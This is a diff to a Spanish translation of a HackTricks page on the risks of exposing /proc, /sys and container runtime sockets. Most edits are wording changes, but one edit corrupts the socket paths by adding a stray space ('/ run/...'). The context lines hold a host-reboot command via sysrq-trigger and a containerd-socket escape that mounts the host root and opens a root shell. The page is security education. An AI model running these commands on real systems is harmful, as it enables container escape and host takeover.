@@ -2,7 +2,7 @@
 
 {{#include ../../../../banners/hacktricks-training.md}}
 
-La exposición de `/proc`, `/sys` y `/var` sin un aislamiento adecuado de namespaces introduce riesgos de seguridad significativos, incluyendo la ampliación de la superficie de ataque y la divulgación de información. Estos directorios contienen archivos sensibles que, si están mal configurados o son accedidos por un usuario no autorizado, pueden llevar a la fuga de contenedores, modificación del host o proporcionar información que facilite ataques adicionales. Por ejemplo, montar incorrectamente `-v /proc:/host/proc` puede eludir la protección de AppArmor debido a su naturaleza basada en rutas, dejando `/host/proc` desprotegido.
+La exposición de `/proc`, `/sys` y `/var` sin un aislamiento adecuado de namespaces introduce riesgos de seguridad significativos, incluyendo la ampliación de la superficie de ataque y la divulgación de información. Estos directorios contienen archivos sensibles que, si están mal configurados o son accedidos por un usuario no autorizado, pueden llevar a la fuga de contenedores, modificación del host o proporcionar información que ayude a ataques adicionales. Por ejemplo, montar incorrectamente `-v /proc:/host/proc` puede eludir la protección de AppArmor debido a su naturaleza basada en rutas, dejando `/host/proc` desprotegido.
 
 **Puedes encontrar más detalles de cada posible vulnerabilidad en** [**https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts**](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts)**.**
 
@@ -10,7 +10,7 @@ La exposición de `/proc`, `/sys` y `/var` sin un aislamiento adecuado de namesp
 
 ### `/proc/sys`
 
-Este directorio permite el acceso para modificar variables del kernel, generalmente a través de `sysctl(2)`, y contiene varios subdirectorios de interés:
+Este directorio permite el acceso para modificar variables del kernel, generalmente a través de `sysctl(2)`, y contiene varias subcarpetas de interés:
 
 #### **`/proc/sys/kernel/core_pattern`**
 
@@ -50,7 +50,7 @@ ls -l $(cat /proc/sys/kernel/modprobe) # Verificar acceso a modprobe
 #### **`/proc/sys/vm/panic_on_oom`**
 
 - Referenciado en [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
-- Una bandera global que controla si el kernel se bloquea o invoca al OOM killer cuando ocurre una condición OOM.
+- Una bandera global que controla si el kernel entra en pánico o invoca al OOM killer cuando ocurre una condición de OOM.
 
 #### **`/proc/sys/fs`**
 
@@ -95,7 +95,7 @@ echo b > /proc/sysrq-trigger # Reinicia el host
 
 #### **`/proc/[pid]/mem`**
 
-- Interactúa con el dispositivo de memoria del kernel `/dev/mem`.
+- Interfaz con el dispositivo de memoria del kernel `/dev/mem`.
 - Históricamente vulnerable a ataques de escalada de privilegios.
 - Más sobre [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
 
@@ -291,11 +291,11 @@ locate the other containers' filesystems and SA / web identity tokens
 Mounting certain host Unix sockets or writable pseudo-filesystems is equivalent to giving the container full root on the node. **Treat the following paths as highly sensitive and never expose them to untrusted workloads**:
 
 ```text
-/run/containerd/containerd.sock     # socket CRI de containerd  
-/var/run/crio/crio.sock             # socket de tiempo de ejecución CRI-O  
-/run/podman/podman.sock             # API de Podman (con privilegios o sin privilegios)  
-/var/run/kubelet.sock               # API de Kubelet en nodos de Kubernetes  
-/run/firecracker-containerd.sock    # Kata / Firecracker
+/ run/containerd/containerd.sock     # socket CRI de containerd  
+/ var/run/crio/crio.sock             # socket de tiempo de ejecución CRI-O  
+/ run/podman/podman.sock             # API de Podman (con privilegios o sin privilegios)  
+/ var/run/kubelet.sock               # API de Kubelet en nodos de Kubernetes  
+/ run/firecracker-containerd.sock    # Kata / Firecracker
 ```
 
 Attack example abusing a mounted **containerd** socket:
@@ -305,7 +305,7 @@ Attack example abusing a mounted **containerd** socket:
 ctr --address /host/run/containerd.sock images pull docker.io/library/busybox:latest
 ctr --address /host/run/containerd.sock run --tty --privileged --mount \
 type=bind,src=/,dst=/host,options=rbind:rw docker.io/library/busybox:latest host /bin/sh
-chroot /host /bin/bash   # shell root completo en el host
+chroot /host /bin/bash   # shell root completa en el host
 ```
 
 A similar technique works with **crictl**, **podman** or the **kubelet** API once their respective sockets are exposed.
